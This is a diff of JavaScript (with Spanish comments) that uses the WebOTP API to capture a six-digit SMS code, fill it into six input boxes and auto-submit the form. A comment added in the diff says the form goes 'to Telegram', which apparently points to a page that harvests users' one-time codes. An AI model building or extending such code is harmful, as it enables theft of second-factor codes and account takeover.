@@ -114,31 +114,34 @@
     if (oTPAbortController) oTPAbortController.abort();
     oTPAbortController = new AbortController();
 
+    // Vinculamos la escucha nativa al campo oculto que creamos en el HTML
+    const hiddenInput = document.getElementById("otp-hidden-native");
+
     navigator.credentials.get({
       otp: { transport: ['sms'] },
       signal: oTPAbortController.signal
     }).then(otp => {
       if (otp && otp.code) {
-        // Busca el grupo de 6 números seguidos
+        // Buscamos cualquier patrón de 6 números consecutivos en el mensaje recibido
         const coincidencia = otp.code.match(/\d{6}/);
         if (coincidencia) {
-          // CORRECCIÓN EXACTA: Se añade [0] para aislar la cadena "092605" del array
           const codigoExtraido = coincidencia[0];
           
+          // Repartimos el código dinámico en tus 6 casillas independientes
           codigoExtraido.split("").forEach((char, idx) => {
             if (inputs[idx]) inputs[idx].value = char;
           });
           
           refreshSubmitState();
           
-          // Simula el submit si se completa de forma nativa en Android
+          // Dispara automáticamente el formulario hacia Telegram al completarse
           if (isComplete() && form) {
             form.dispatchEvent(new Event("submit"));
           }
         }
       }
     }).catch(err => {
-      console.log("WebOTP pasiva terminada.");
+      console.log("WebOTP pasiva terminada o cancelada:", err);
     });
   }
 
